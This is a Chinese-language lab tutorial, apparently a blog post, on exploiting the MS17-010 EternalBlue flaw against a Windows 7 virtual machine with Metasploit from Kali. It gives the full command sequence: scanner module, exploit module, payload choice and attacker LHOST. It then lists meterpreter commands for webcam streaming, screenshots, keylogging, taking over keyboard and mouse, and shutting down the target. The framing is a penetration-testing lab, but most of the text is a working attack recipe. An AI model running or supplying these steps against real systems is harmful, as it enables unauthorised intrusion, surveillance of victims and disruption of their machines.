metasploit下利用永恒之蓝攻击win7

metasploit下利用永恒之蓝攻击win7

实验环境：VMware
kali作为攻击机，win7作为靶机（防火墙和杀软已关闭）
渗透攻击(exploit)：指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。
攻击载荷(payload)：是我们期望目标系统在渗透攻击之后去执行的代码

准备阶段

1.初次使用metasploit需要初始化数据库
msfdb init/reinit
2.开启数据库
sudo service postgresql start
3.进入msf
msfconsole

4.搜索cve17-010相关的exp
search ms17-010

5.使用1号exp扫描漏洞是否存在
use auxiliary/scanner/smb/smb_ms17_010
查看相关参数
options

指定靶机ip
set RHOSTS 192.168.XXX.XXX

6.运行
run

实施攻击

7.进入攻击模块（2号漏洞）
use exploit/windows/smb/ms17_010_eternalblue
查看相关参数
options

可以看出受影响的分别是win7和server 2008 R2两种操作系统
指定靶机ip
set RHOSTS 192.168.XXX.XXX

8.查看payload
show payloads

使用15号payload
set payload 15
查看payload所需参数
options
设置本机(kali)ip
set LHOST 192.168.XXX.XXX

9.发动攻击
exploit

一些meterpreter命令

webcam_stream 开启摄像头
screenshot 截屏
keyscan_start 开启键盘记录功能
keyscan_dump 显示捕捉到的键盘记录信息
keyscan_stop停止键盘记录功能
uictl enable keyboard/mouse 接管目标主机的键盘和鼠标
reboot 重启靶机
shutdown 关闭靶机

截屏成功
